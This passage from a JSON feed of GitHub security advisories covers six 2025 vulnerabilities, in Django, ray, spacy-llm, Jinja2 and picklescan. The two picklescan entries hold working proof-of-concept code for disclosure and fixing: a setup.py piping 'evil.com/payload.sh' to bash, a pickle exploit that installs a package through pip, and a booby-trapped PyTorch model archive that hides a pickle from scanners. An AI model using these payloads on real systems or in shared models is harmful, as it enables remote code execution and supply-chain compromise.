            "content_html": "<p>An issue was discovered in Django 5.1 before 5.1.7, 5.0 before 5.0.13, and 4.2 before 4.2.20. The django.utils.text.wrap() method and wordwrap template filter are subject to a potential denial-of-service attack when used with very long strings.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-26699\">https://nvd.nist.gov/vuln/detail/CVE-2025-26699</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/dev/releases/security\">https://docs.djangoproject.com/en/dev/releases/security</a></li>\n<li><a href=\"https://groups.google.com/g/django-announce\">https://groups.google.com/g/django-announce</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2025/mar/06/security-releases\">https://www.djangoproject.com/weblog/2025/mar/06/security-releases</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/03/06/12\">http://www.openwall.com/lists/oss-security/2025/03/06/12</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p3fp-8748-vqfq\">https://github.com/advisories/GHSA-p3fp-8748-vqfq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p3fp-8748-vqfq",
            "title": "[Django] Django vulnerable to Allocation of Resources Without Limits or Throttling",
            "date_modified": "2025-03-06T22:35:39.000Z",
            "date_published": "2025-03-06T21:31:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p3fp-8748-vqfq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Versions of the package ray before 2.43.0 are vulnerable to Insertion of Sensitive Information into Log File where the redis password is being logged in the standard logging. If the redis password is passed as an argument, it will be logged and could potentially leak the password.</p>\n<p>This is only exploitable if:</p>\n<ol>\n<li><p>Logging is enabled;</p>\n</li>\n<li><p>Redis is using password authentication;</p>\n</li>\n<li><p>Those logs are accessible to an attacker, who can reach that redis instance.</p>\n</li>\n</ol>\n<p><strong>Note:</strong></p>\n<p>It is recommended that anyone who is running in this configuration should update to the latest version of Ray, then rotate their redis password.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1979\">https://nvd.nist.gov/vuln/detail/CVE-2025-1979</a></li>\n<li><a href=\"https://github.com/ray-project/ray/issues/50266\">https://github.com/ray-project/ray/issues/50266</a></li>\n<li><a href=\"https://github.com/ray-project/ray/pull/50409\">https://github.com/ray-project/ray/pull/50409</a></li>\n<li><a href=\"https://github.com/ray-project/ray/commit/64a2e4010522d60b90c389634f24df77b603d85d\">https://github.com/ray-project/ray/commit/64a2e4010522d60b90c389634f24df77b603d85d</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-PYTHON-RAY-8745212\">https://security.snyk.io/vuln/SNYK-PYTHON-RAY-8745212</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w4rh-fgx7-q63m\">https://github.com/advisories/GHSA-w4rh-fgx7-q63m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w4rh-fgx7-q63m",
            "title": "[ray] ray vulnerable to Insertion of Sensitive Information into Log File",
            "date_modified": "2025-03-06T22:31:55.000Z",
            "date_published": "2025-03-06T06:30:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w4rh-fgx7-q63m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"cve-2025-1716\">CVE-2025-1716</h3>\n<h3 id=\"summary\">Summary</h3>\n<p>An unsafe deserialization vulnerability in Python’s pickle module allows an attacker to bypass static analysis tools like Picklescan and execute arbitrary code during deserialization. This can be exploited to run pip install and fetch a malicious package, enabling remote code execution (RCE) upon package installation.</p>\n<h3 id=\"details\">Details</h3>\n<p>Pickle’s deserialization process allows execution of arbitrary functions via the <strong>reduce</strong> method. While Picklescan is designed to detect such exploits, this attack evades detection by leveraging pip.main() as the callable function. Since pip is a legitimate package operation, it may not raise red flags in security scans.</p>\n<p>The payload executes the following steps:</p>\n<ol>\n<li>During unpickling, it calls pip.main() to install a malicious PyPI package.</li>\n<li>The installed package runs arbitrary code via setup.py, entry_points, or post-install hooks.</li>\n<li>Execution is silent, with minimal logging to avoid detection.</li>\n</ol>\n<h3 id=\"poc\">PoC</h3>\n<p>Step 1: Create the Malicious Package\nHost a PyPI package with a malicious setup.py or entry_point.</p>\n<p>Example malicious <code>setup.py</code></p>\n<pre><code>from setuptools import setup\nimport os\n\nos.system(\"curl -s https://evil.com/payload.sh | bash\")  # Executes remote shell script\n\nsetup(\n    name=\"rsac-demo-package\",\n    version=\"0.1\",\n    packages=[\"rsac_demo\"],\n    install_requires=[],\n)\n</code></pre>\n<p>Upload it to PyPI or host on GitHub.</p>\n<p>Step 2: Exploit via Pickle</p>\n<pre><code>import pickle\nimport pip\n\nclass Exploit:\n    def __reduce__(self):\n        return pip.main, (\n            ['install', 'git+https://github.com/madgetr/rsac-demo-package', '--no-input', '-q', '-q', '-q',\n             '--exists-action', 'i', '--isolated'],\n        )\n\nmalicious_pickle = pickle.dumps(Exploit())\n\n# Simulating deserialization attack\npickle.loads(malicious_pickle)\n</code></pre>\n<p>This installs a malicious package from GitHub or PyPI.\nThe payload runs automatically when unpickled, executing any code inside the installed package leveraging the <code>setup.py</code> file.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Remote Code Execution (RCE): Any system that deserializes a malicious pickle is compromised.\nSupply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects.\nBypasses Picklescan: Security tools may not flag pip.main(), making it harder to detect.</p>\n<h3 id=\"recommended-fixes\">Recommended Fixes</h3>\n<p>Add  <code>\"pip\": \"*\"</code> to the list of <a href=\"https://github.com/mmaitre314/picklescan/blob/25d753f4b9a27ce141a43df3bf88d731800593d9/src/picklescan/scanner.py#L96\">unsafe globals</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mmaitre314/picklescan/security/advisories/GHSA-655q-fx9r-782v\">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-655q-fx9r-782v</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1716\">https://nvd.nist.gov/vuln/detail/CVE-2025-1716</a></li>\n<li><a href=\"https://github.com/mmaitre314/picklescan/commit/78ce704227c51f070c0c5fb4b466d92c62a7aa3d\">https://github.com/mmaitre314/picklescan/commit/78ce704227c51f070c0c5fb4b466d92c62a7aa3d</a></li>\n<li><a href=\"https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1716\">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1716</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-655q-fx9r-782v\">https://github.com/advisories/GHSA-655q-fx9r-782v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-655q-fx9r-782v",
            "title": "[picklescan] Picklescan Allows Remote Code Execution via Malicious Pickle File Bypassing Static Analysis",
            "date_modified": "2025-03-06T14:52:21.000Z",
            "date_published": "2025-03-03T20:05:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-655q-fx9r-782v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"cve-2025-1889\">CVE-2025-1889</h3>\n<h3 id=\"summary\">Summary</h3>\n<p>Picklescan fails to detect hidden pickle files embedded in PyTorch model archives due to its reliance on file extensions for detection. This allows an attacker to embed a secondary, malicious pickle file with a non-standard extension inside a model archive, which remains undetected by picklescan but is still loaded by PyTorch's torch.load() function. This can lead to arbitrary code execution when the model is loaded.</p>\n<h3 id=\"details\">Details</h3>\n<p>Picklescan primarily identifies pickle files by their extensions (e.g., .pkl, .pt). However, PyTorch allows specifying an alternative pickle file inside a model archive using the pickle_file parameter when calling torch.load(). This makes it possible to embed a malicious pickle file (e.g., config.p) inside the model while keeping the primary data.pkl file benign.</p>\n<p>A typical attack works as follows:</p>\n<ul>\n<li>A PyTorch model (model.pt) is created and saved normally.</li>\n<li>A second pickle file (config.p) containing a malicious payload is crafted.</li>\n<li>The data.pkl file in the model is modified to contain an object that calls torch.load(model.pt, pickle_file='config.p'), causing config.p to be loaded when the model is opened.</li>\n<li>Since picklescan ignores non-standard extensions, it does not scan config.p, allowing the malicious payload to evade detection.</li>\n<li>The issue is exacerbated by the fact that PyTorch models are widely shared in ML repositories and organizations, making it a potential supply-chain attack vector.</li>\n</ul>\n<h3 id=\"poc\">PoC</h3>\n<pre><code>import os\nimport pickle\nimport torch\nimport zipfile\nfrom functools import partial\n\nclass RemoteCodeExecution:\n    def __reduce__(self):\n        return os.system, (\"curl -s http://localhost:8080 | bash\",)\n\n# Create a directory inside the model\nos.makedirs(\"model\", exist_ok=True)\n\n# Create a hidden malicious pickle file\nwith open(\"model/config.p\", \"wb\") as f:\n    pickle.dump(RemoteCodeExecution(), f)\n\n# Create a benign model\nmodel = {}\nclass AutoLoad:\n    def __init__(self, path, **kwargs):\n        self.path = path\n        self.kwargs = kwargs\n\n    def __reduce__(self):\n        # Use functools.partial to create a partially applied function\n        # with torch.load and the pickle_file argument\n        return partial(torch.load, self.path, **self.kwargs), ()\n\nmodel['config'] = AutoLoad(model_name, pickle_file='config.p', weights_only=False)\ntorch.save(model, \"model.pt\")\n\n# Inject the second pickle into the model archive\nwith zipfile.ZipFile(\"model.pt\", \"a\") as archive:\n    archive.write(\"model/config.p\", \"model/config.p\")\n\n# Loading the model triggers execution of config.p\ntorch.load(\"model.pt\")\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Severity: High</p>\n<p>Who is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.</p>\n<p>What is the impact? Attackers can embed malicious code in PyTorch models that remains undetected but executes when the model is loaded.</p>\n<p>Potential Exploits: This vulnerability could be exploited in supply chain attacks, backdooring pre-trained models distributed via repositories like Hugging Face or PyTorch Hub.</p>\n<h3 id=\"recommendations\">Recommendations</h3>\n<ol>\n<li>Scan All Files in the ZIP Archive: picklescan should analyze all files in the archive instead of relying on file extensions.</li>\n<li>Detect Hidden Pickle References: Static analysis should detect torch.load(pickle_file=...) calls inside data.pkl.</li>\n<li>Magic Byte Detection: Instead of relying on extensions, picklescan should inspect file contents for pickle magic bytes (\\x80\\x05).</li>\n<li>Block the following globals:\n - torch.load\n - Block functools.partial</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mmaitre314/picklescan/security/advisories/GHSA-769v-p64c-89pr\">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-769v-p64c-89pr</a></li>\n<li><a href=\"https://github.com/mmaitre314/picklescan/commit/baf03faf88fece56a89534d12ce048e5ee36e50e\">https://github.com/mmaitre314/picklescan/commit/baf03faf88fece56a89534d12ce048e5ee36e50e</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1889\">https://nvd.nist.gov/vuln/detail/CVE-2025-1889</a></li>\n<li><a href=\"https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1889\">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1889</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-769v-p64c-89pr\">https://github.com/advisories/GHSA-769v-p64c-89pr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-769v-p64c-89pr",
            "title": "[picklescan] PyTorch Model Files Can Bypass Pickle Scanners via Unexpected Pickle Extensions",
            "date_modified": "2025-03-06T14:52:11.000Z",
            "date_published": "2025-03-03T19:59:46.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-769v-p64c-89pr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A Server-Side Template Injection (SSTI) vulnerability in Spacy-LLM v0.7.2 allows attackers to execute arbitrary code via injecting a crafted payload into the template field.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25362\">https://nvd.nist.gov/vuln/detail/CVE-2025-25362</a></li>\n<li><a href=\"https://github.com/explosion/spacy-llm/issues/492\">https://github.com/explosion/spacy-llm/issues/492</a></li>\n<li><a href=\"https://github.com/explosion/spacy-llm/pull/491\">https://github.com/explosion/spacy-llm/pull/491</a></li>\n<li><a href=\"https://github.com/explosion/spacy-llm/commit/8bde0490cc1e9de9dd2e84480b7b5cd18a94d739\">https://github.com/explosion/spacy-llm/commit/8bde0490cc1e9de9dd2e84480b7b5cd18a94d739</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-793v-gxfp-9q9h\">https://github.com/advisories/GHSA-793v-gxfp-9q9h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-793v-gxfp-9q9h",
            "title": "[spacy-llm] Spacy-LLM Server-Side Template Injection (SSTI) vulnerability",
            "date_modified": "2025-03-06T17:18:49.000Z",
            "date_published": "2025-03-05T21:32:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-793v-gxfp-9q9h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An oversight in how the Jinja sandboxed environment interacts with the <code>|attr</code> filter allows an attacker that controls the content of a template to execute arbitrary Python code.</p>\n<p>To exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.</p>\n<p>Jinja's sandbox does catch calls to <code>str.format</code> and ensures they don't escape the sandbox. However, it's possible to use the <code>|attr</code> filter to get a reference to a string's plain format method, bypassing the sandbox. After the fix, the <code>|attr</code> filter no longer bypasses the environment's attribute lookup.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pallets/jinja/security/advisories/GHSA-cpwx-vrp4-4pq7\">https://github.com/pallets/jinja/security/advisories/GHSA-cpwx-vrp4-4pq7</a></li>\n<li><a href=\"https://github.com/pallets/jinja/commit/90457bbf33b8662926ae65cdde4c4c32e756e403\">https://github.com/pallets/jinja/commit/90457bbf33b8662926ae65cdde4c4c32e756e403</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27516\">https://nvd.nist.gov/vuln/detail/CVE-2025-27516</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cpwx-vrp4-4pq7\">https://github.com/advisories/GHSA-cpwx-vrp4-4pq7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cpwx-vrp4-4pq7",
            "title": "[Jinja2] Jinja2 vulnerable to sandbox breakout through attr filter selecting format method",
            "date_modified": "2025-03-05T21:54:05.000Z",
            "date_published": "2025-03-05T20:40:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cpwx-vrp4-4pq7"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}